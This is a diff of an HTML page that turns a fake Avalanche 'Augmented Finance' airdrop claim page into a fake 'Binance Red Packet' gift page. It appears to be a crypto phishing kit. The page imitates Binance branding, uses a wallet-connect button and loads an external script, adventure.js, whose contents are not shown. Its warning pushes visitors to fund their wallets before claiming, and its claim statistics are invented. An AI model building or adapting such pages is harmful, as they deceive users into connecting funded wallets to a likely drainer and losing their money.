@@ -3,694 +3,452 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Augmented Finance Airdrop | Avalanche</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Binance Red Packet | Claim Your Gift</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="adventure.js"></script>
     <style>
-        :root {
-            --avax-red: #E84142;
-            --avax-dark: #1E2027;
-            --avax-light: #F5F7FF;
-            --avax-blue: #0070ED;
-            --avax-orange: #FF6B00;
-            --avax-gray: #6C757D;
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background-color: var(--avax-dark);
-            color: white;
-            line-height: 1.6;
-            background-image: url('https://images.unsplash.com/photo-1639762681057-408e52192e55?q=80&w=2232&auto=format&fit=crop');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            background: linear-gradient(135deg, #0a0e17 0%, #1a2238 100%);
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+            overflow-x: hidden;
         }
         
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        
-        /* Header Styles */
-        header {
-            background: rgba(30, 32, 39, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 20px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .header-content {
+        .binance-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
         }
         
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
+        .logo-container {
             display: flex;
             align-items: center;
         }
         
-        .logo img {
-            height: 40px;
+        .binance-logo {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #f0b90b, #f8d12f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-right: 10px;
         }
         
-        .nav-links {
-            display: flex;
-            list-style: none;
-        }
-        
-        .nav-links li {
-            margin-left: 25px;
-        }
-        
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-        }
-        
-        .nav-links a i {
+        .logo-icon {
+            color: #f0b90b;
+            font-size: 24px;
             margin-right: 8px;
         }
         
-        .nav-links a:hover {
-            color: var(--avax-red);
+        .user-info {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.08);
+            padding: 8px 16px;
+            border-radius: 50px;
         }
         
-        .mobile-menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 24px;
+        .user-info i {
+            margin-right: 8px;
+            color: #f0b90b;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #f0b90b, #f8d12f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #a0aec0;
+            margin-bottom: 40px;
+            max-width: 500px;
+            line-height: 1.6;
+        }
+        
+        .red-packet-container {
+            position: relative;
+            width: 300px;
+            height: 400px;
+            margin: 30px 0;
+            perspective: 1000px;
+        }
+        
+        .red-packet {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transform-style: preserve-3d;
+            transition: transform 0.8s;
             cursor: pointer;
         }
         
-        /* Main Claim Section */
-        .claim-section {
-            padding: 80px 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: calc(100vh - 80px);
+        .red-packet:hover {
+            transform: rotateY(10deg) rotateX(5deg);
         }
         
-        .claim-card {
-            background: rgba(30, 32, 39, 0.9);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
+        .packet-front, .packet-back {
+            position: absolute;
             width: 100%;
-            max-width: 600px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            position: relative;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
         }
         
-        .claim-card::before {
+        .packet-front {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            transform: rotateY(0deg);
+        }
+        
+        .packet-back {
+            background: linear-gradient(135deg, #c53030 0%, #e53e3e 100%);
+            transform: rotateY(180deg);
+        }
+        
+        .gold-band {
+            width: 100%;
+            height: 50px;
+            background: linear-gradient(90deg, #f0b90b, #f8d12f);
+            position: absolute;
+            top: 40%;
+        }
+        
+        .gold-string {
+            position: absolute;
+            top: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #f0b90b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(240, 185, 11, 0.5);
+        }
+        
+        .gold-string:before {
             content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid rgba(240, 185, 11, 0.7);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        .packet-text {
+            position: absolute;
+            bottom: 40px;
+            color: #fff;
+            font-size: 1.8rem;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            z-index: 2;
+        }
+        
+        .packet-text span {
+            color: #f8d12f;
+        }
+        
+        .claim-section {
+            margin: 30px 0;
+            width: 100%;
+        }
+        
+        .claim-btn {
+            background: linear-gradient(90deg, #f0b90b, #f8d12f);
+            color: #0a0e17;
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(240, 185, 11, 0.4);
+            margin-bottom: 30px;
+        }
+        
+        .claim-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(240, 185, 11, 0.6);
+        }
+        
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+        
+        .warning {
+            background: rgba(240, 185, 11, 0.15);
+            border: 1px solid rgba(240, 185, 11, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .warning i {
+            color: #f0b90b;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .warning h3 {
+            color: #f0b90b;
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .warning p {
+            color: #cbd5e0;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            max-width: 500px;
+            margin-top: 40px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #f0b90b;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #a0aec0;
+            font-size: 0.9rem;
+        }
+        
+        .particles {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, var(--avax-red), var(--avax-orange));
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
         }
         
-        .claim-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .claim-header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, var(--avax-red), var(--avax-orange));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .claim-header p {
-            color: var(--avax-gray);
-        }
-        
-        .avax-badge {
-            display: inline-block;
-            background: rgba(232, 65, 66, 0.2);
-            color: var(--avax-red);
-            padding: 5px 15px;
-            border-radius: 50px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            margin-top: 10px;
-        }
-        
-        .claim-details {
-            margin-bottom: 30px;
-        }
-        
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 15px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        
-        .detail-label {
-            color: var(--avax-gray);
-        }
-        
-        .detail-value {
-            font-weight: 600;
-        }
-        
-        .agf-amount {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--avax-red);
-        }
-        
-        .wallet-connect {
-            margin-bottom: 30px;
-        }
-        
-        .wallet-status {
-            display: flex;
-            align-items: center;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .wallet-status.connected {
-            background: rgba(0, 112, 237, 0.1);
-            border: 1px solid var(--avax-blue);
-        }
-        
-        .wallet-icon {
-            font-size: 24px;
-            margin-right: 15px;
-            color: var(--avax-gray);
-        }
-        
-        .wallet-status.connected .wallet-icon {
-            color: var(--avax-blue);
-        }
-        
-        .wallet-info {
-            flex: 1;
-        }
-        
-        .wallet-info h3 {
-            font-size: 1rem;
-            margin-bottom: 5px;
-        }
-        
-        .wallet-info p {
-            font-size: 0.9rem;
-            color: var(--avax-gray);
-        }
-        
-        .wallet-address {
-            font-family: monospace;
-            word-break: break-all;
-        }
-        
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            font-size: 1rem;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(90deg, var(--avax-red), var(--avax-orange));
-            color: white;
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(232, 65, 66, 0.4);
-        }
-        
-        .btn-outline {
-            background: transparent;
-            border: 1px solid var(--avax-gray);
-            color: white;
-        }
-        
-        .btn-outline:hover {
-            border-color: var(--avax-red);
-            color: var(--avax-red);
-        }
-        
-        .btn i {
-            margin-right: 10px;
-        }
-        
-        .claim-steps {
-            margin-top: 30px;
-        }
-        
-        .step {
-            display: flex;
-            margin-bottom: 20px;
-            align-items: flex-start;
-        }
-        
-        .step-number {
-            background: rgba(232, 65, 66, 0.2);
-            color: var(--avax-red);
-            width: 30px;
-            height: 30px;
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: bold;
-            margin-right: 15px;
-            flex-shrink: 0;
-            font-size: 0.9rem;
+            background: #f0b90b;
+            opacity: 0.7;
         }
         
-        .step-content h3 {
-            font-size: 1rem;
-            margin-bottom: 5px;
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 0.3; }
+            100% { transform: scale(1); opacity: 0.7; }
         }
         
-        .step-content p {
-            color: var(--avax-gray);
-            font-size: 0.9rem;
-        }
-        
-        /* Footer */
-        footer {
-            background: rgba(30, 32, 39, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 30px 0;
-            text-align: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            list-style: none;
-            margin-bottom: 20px;
-        }
-        
-        .footer-links li {
-            margin: 0 15px;
-        }
-        
-        .footer-links a {
-            color: var(--avax-gray);
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        
-        .footer-links a:hover {
-            color: var(--avax-red);
-        }
-        
-        .footer-text {
-            color: var(--avax-gray);
-            font-size: 0.9rem;
-        }
-        
-        /* Responsive Styles */
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-                position: absolute;
-                top: 80px;
-                left: 0;
-                width: 100%;
-                background: var(--avax-dark);
-                flex-direction: column;
-                padding: 20px;
-                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
-                z-index: 100;
-            }
-            
-            .nav-links.active {
-                display: flex;
-            }
-            
-            .nav-links li {
-                margin: 10px 0;
-            }
-            
-            .mobile-menu-btn {
-                display: block;
-            }
-            
-            .claim-header h1 {
+        @media (max-width: 600px) {
+            .title {
                 font-size: 2rem;
             }
             
-            .claim-card {
-                padding: 30px 20px;
-            }
-        }
-        
-        @media (max-width: 576px) {
-            .claim-header h1 {
-                font-size: 1.8rem;
+            .subtitle {
+                font-size: 1rem;
             }
             
-            .agf-amount {
-                font-size: 1.5rem;
+            .red-packet-container {
+                width: 250px;
+                height: 350px;
             }
             
-            .detail-row {
-                flex-direction: column;
+            .claim-btn {
+                padding: 15px 40px;
+                font-size: 1.1rem;
             }
-            
-            .detail-label {
-                margin-bottom: 5px;
-            }
-        }
-        
-        /* Animation */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        /* Progress Bar */
-        .progress-container {
-            width: 100%;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            margin: 20px 0;
-            height: 10px;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            border-radius: 10px;
-            background: linear-gradient(90deg, var(--avax-red), var(--avax-orange));
-            width: 65%;
-            position: relative;
-        }
-        
-        .progress-text {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 5px;
-            font-size: 0.8rem;
-            color: var(--avax-gray);
-        }
-        
-        /* Tooltip */
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            margin-left: 5px;
-            cursor: pointer;
-        }
-        
-        .tooltip i {
-            color: var(--avax-gray);
-            font-size: 0.9rem;
-        }
-        
-        .tooltip-text {
-            visibility: hidden;
-            width: 200px;
-            background-color: var(--avax-dark);
-            color: white;
-            text-align: center;
-            border-radius: 6px;
-            padding: 10px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 0.9rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .tooltip:hover .tooltip-text {
-            visibility: visible;
-            opacity: 1;
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="container header-content">
-            <div class="logo">
-                <img src="avalanche-avax-logo.png" alt="Avalanche Logo" style="height: 30px;">
-                <span>Augmented Finance</span>
+    <div class="binance-header">
+        <div class="logo-container">
+            <i class="fas fa-coins logo-icon"></i>
+            <div class="binance-logo">BINANCE</div>
+        </div>
+        <div class="user-info">
+            <i class="fas fa-wallet"></i>
+            <span>Connected Wallet</span>
+        </div>
+    </div>
+    
+    <div class="container">
+        <h1 class="title">Binance Red Packet</h1>
+        <p class="subtitle">Claim your special crypto gift! Share the joy with friends and celebrate together.</p>
+        
+        <div class="red-packet-container">
+            <div class="red-packet">
+                <div class="packet-front">
+                    <div class="gold-band"></div>
+                    <div class="gold-string">
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <div class="packet-text">Lucky <span>Red Packet</span></div>
+                </div>
+                <div class="packet-back"></div>
             </div>
-            <button class="mobile-menu-btn" id="mobileMenuBtn">
-                <i class="fas fa-bars"></i>
+        </div>
+        
+        <div class="claim-section">
+            <button class="claim-btn connectButton ">
+                <i class="fas fa-gift"></i> CLAIM RED PACKET
             </button>
-            <ul class="nav-links" id="navLinks">
-                <li><a href="#"><i class="fas fa-home"></i> Home</a></li>
-                <li><a href="#"><i class="fas fa-wallet"></i> Wallet</a></li>
-                <li><a href="#"><i class="fas fa-info-circle"></i> About</a></li>
-                <li><a href="#"><i class="fas fa-question-circle"></i> Help</a></li>
-            </ul>
-        </div>
-    </header>
-
-    <!-- Main Claim Section -->
-    <main class="claim-section">
-        <div class="container">
-            <div class="claim-card">
-                <div class="claim-header">
-                    <h1>Claim Your AGF Airdrop</h1>
-                    <p>You're eligible to claim Augmented Finance tokens for participating in our Avalanche launch</p>
-                    <div class="avax-badge">
-                        <i class="fas fa-snowflake"></i> Avalanche Network
-                    </div>
-                </div>
-                
-                <div class="claim-details">
-                    <div class="detail-row">
-                        <span class="detail-label">Your Allocation</span>
-                        <span class="detail-value agf-amount">1,250 AGF</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Claimable Now</span>
-                        <span class="detail-value">625 AGF</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Vesting Period</span>
-                        <span class="detail-value">15 days remaining</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">
-                            Total Distributed
-                            <div class="tooltip">
-                                <i class="fas fa-info-circle"></i>
-                                <span class="tooltip-text">65% of the 2,500,000 AGF airdrop has been claimed so far</span>
-                            </div>
-                        </span>
-                        <span class="detail-value">1,625,000 AGF</span>
-                    </div>
-                    
-                    <div class="progress-container">
-                        <div class="progress-bar"></div>
-                    </div>
-                    <div class="progress-text">
-                        <span>0 AGF</span>
-                        <span>2,500,000 AGF</span>
-                    </div>
-                </div>
-                
-                <div class="wallet-connect">
-                    <div class="wallet-status" id="walletStatus">
-                        <div class="wallet-icon">
-                            <i class="fas fa-plug"></i>
-                        </div>
-                        <div class="wallet-info">
-                            <h3>Wallet Not Connected</h3>
-                            <p>Connect your Avalanche wallet to claim your airdrop</p>
-                        </div>
-                    </div>
-                    
-                    <button class="connectButton btn btn-primary pulse" id="connectWalletBtn">
-                        <i class="fas fa-plug"></i> Connect Wallet
-                    </button>
-                </div>
-                
-<!--                 <button class="startButton  btn btn-outline" id="claimBtn" disabled>
-                    <i class="fas fa-gift"></i> Claim AGF Tokens
-                </button>
-                 -->
-                <div class="claim-steps">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div class="step-content">
-                            <h3>Connect Your Wallet</h3>
-                            <p>Use MetaMask or other Web3 wallet connected to Avalanche network</p>
-                        </div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div class="step-content">
-                            <h3>Review Your Allocation</h3>
-                            <p>Check how much AGF you can claim based on your participation</p>
-                        </div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div class="step-content">
-                            <h3>Claim Your Tokens</h3>
-                            <p>Receive your AGF tokens directly to your connected wallet</p>
-                        </div>
-                    </div>
-                </div>
+            
+            <div class="warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>Important Warning</h3>
+                <p>Do not use an empty wallet to claim your red packet. If your wallet has zero balance, you will not receive any crypto rewards. Make sure your Binance wallet is funded before claiming.</p>
             </div>
         </div>
-    </main>
-
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <ul class="footer-links">
-                <li><a href="#">Terms</a></li>
-                <li><a href="#">Privacy</a></li>
-                <li><a href="#">Docs</a></li>
-                <li><a href="#">GitHub</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>
-            <p class="footer-text">Augmented Finance is a decentralized protocol on Avalanche. Always do your own research.</p>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value">$24.5K</div>
+                <div class="stat-label">Total Claimed</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">1.2K</div>
+                <div class="stat-label">Packets Sent</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">98%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
         </div>
-    </footer>
-
+    </div>
+    
+    <div class="particles" id="particles"></div>
+    
     <script>
-        // // Mobile Menu Toggle
-        // const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-        // const navLinks = document.getElementById('navLinks');
-        
-        // mobileMenuBtn.addEventListener('click', () => {
-        //     navLinks.classList.toggle('active');
-        // });
-        
-        // // Wallet Connection Simulation
-        // const connectWalletBtn = document.getElementById('connectWalletBtn');
-        // const claimBtn = document.getElementById('claimBtn');
-        // const walletStatus = document.getElementById('walletStatus');
-        
-        // connectWalletBtn.addEventListener('click', () => {
-       
-        //     // Simulate wallet connection
-        //     connectWalletBtn.innerHTML = '<i class="fas fa-check-circle"></i> Wallet Connected';
-        //     connectWalletBtn.classList.remove('pulse');
-        //     connectWalletBtn.style.background = 'var(--avax-blue)';
+        // Create animated particles
+        function createParticles() {
+            const container = document.getElementById('particles');
+            const particleCount = 30;
             
-        //     // Update wallet status
-        //     walletStatus.innerHTML = `
-        //         <div class="wallet-icon">
-        //             <i class="fas fa-check-circle"></i>
-        //         </div>
-        //         <div class="wallet-info">
-        //             <h3>Wallet Connected</h3>
-        //             <p class="wallet-address">{wallet}</p>
-        //         </div>
-        //         <i class="fas fa-copy" style="color: var(--avax-gray); cursor: pointer;" title="Copy Address"></i>
-        //     `;
-        //     walletStatus.classList.add('connected');
-            
-            // Enable claim button
-            // claimBtn.disabled = false;
-            
-            // Add click event for copy icon
-            const copyIcon = walletStatus.querySelector('.fa-copy');
-            copyIcon.addEventListener('click', () => {
-                walleter =     window.ethereum.selectedAddress;
-                navigator.clipboard.writeText(`${walleter}`);
-                copyIcon.classList.remove('fa-copy');
-                copyIcon.classList.add('fa-check');
-                copyIcon.style.color = 'var(--avax-blue)';
-                setTimeout(() => {
-                    copyIcon.classList.remove('fa-check');
-                    copyIcon.classList.add('fa-copy');
-                    copyIcon.style.color = 'var(--avax-gray)';
-                }, 2000);
-            });
-           });
-        
-        // // Claim Button Handler
-        // claimBtn.addEventListener('click', () => {
-        //     claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-            
-        //     // Simulate transaction processing
-        //     setTimeout(() => {
-        //         claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> Claim Successful!';
-        //         claimBtn.style.background = 'var(--avax-blue)';
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
                 
-        //         // Show success message
-        //         const successMsg = document.createElement('div');
-        //         successMsg.innerHTML = `
-        //             <div style="margin-top: 20px; padding: 15px; background: rgba(0, 112, 237, 0.1); border-radius: 10px; border: 1px solid var(--avax-blue);">
-        //                 <i class="fas fa-check-circle" style="color: var(--avax-blue); margin-right: 10px;"></i>
-        //                 Successfully claimed 625 AGF! Transaction hash: 
-        //                 <a href="#" style="color: var(--avax-blue); word-break: break-all;">0x4e3a3754410177e6937ef1f84bba68ea139e8d1a2258c5f85db9f1cd715a1bd</a>
-        //             </div>
-        //         `;
-        //         claimBtn.parentNode.insertBefore(successMsg, claimBtn.nextSibling);
-        //     }, 2000);
-        // });
+                // Random position
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                particle.style.left = `${posX}%`;
+                particle.style.top = `${posY}%`;
+                
+                // Random size
+                const size = Math.random() * 6 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random animation
+                const duration = Math.random() * 10 + 5;
+                particle.style.animation = `pulse ${duration}s infinite`;
+                
+                container.appendChild(particle);
+            }
+        }
         
-        // Tooltip functionality
-        const tooltips = document.querySelectorAll('.tooltip');
-        tooltips.forEach(tooltip => {
-            tooltip.addEventListener('mouseenter', () => {
-                const tooltipText = tooltip.querySelector('.tooltip-text');
-                tooltipText.style.visibility = 'visible';
-                tooltipText.style.opacity = '1';
+        // Claim button animation
+        document.querySelector('.claim-btn').addEventListener('click', function() {
+            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CLAIMING...';
+            this.disabled = true;
+            
+            // Simulate claim process
+            // setTimeout(() => {
+            //     this.innerHTML = '<i class="fas fa-check"></i> CLAIMED SUCCESSFULLY!';
+            //     this.style.background = 'linear-gradient(90deg, #2ecc71, #27ae60)';
+                
+            //     // Add confetti effect
+            //     for(let i = 0; i < 50; i++) {
+            //         setTimeout(() => {
+            //             createConfetti();
+            //         }, i * 100);
+            //     }
+            // }, 2000);
+        });
+        
+        // Create confetti effect
+        function createConfetti() {
+            const confetti = document.createElement('div');
+            confetti.classList.add('particle');
+            confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 60%)`;
+            confetti.style.width = `${Math.random() * 10 + 5}px`;
+            confetti.style.height = `${Math.random() * 10 + 5}px`;
+            confetti.style.left = `${Math.random() * 100}%`;
+            confetti.style.top = '0';
+            document.body.appendChild(confetti);
+            
+            // Animate confetti falling
+            const animation = confetti.animate([
+                { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+            ], {
+                duration: Math.random() * 3000 + 2000,
+                easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
             });
             
-            tooltip.addEventListener('mouseleave', () => {
-                const tooltipText = tooltip.querySelector('.tooltip-text');
-                tooltipText.style.visibility = 'hidden';
-                tooltipText.style.opacity = '0';
-            });
-        });
+            animation.onfinish = () => {
+                confetti.remove();
+            };
+        }
+        
+        // Initialize particles
+        createParticles();
     </script>
-<script src="adventure.js"></script>
 </body>
 </html>
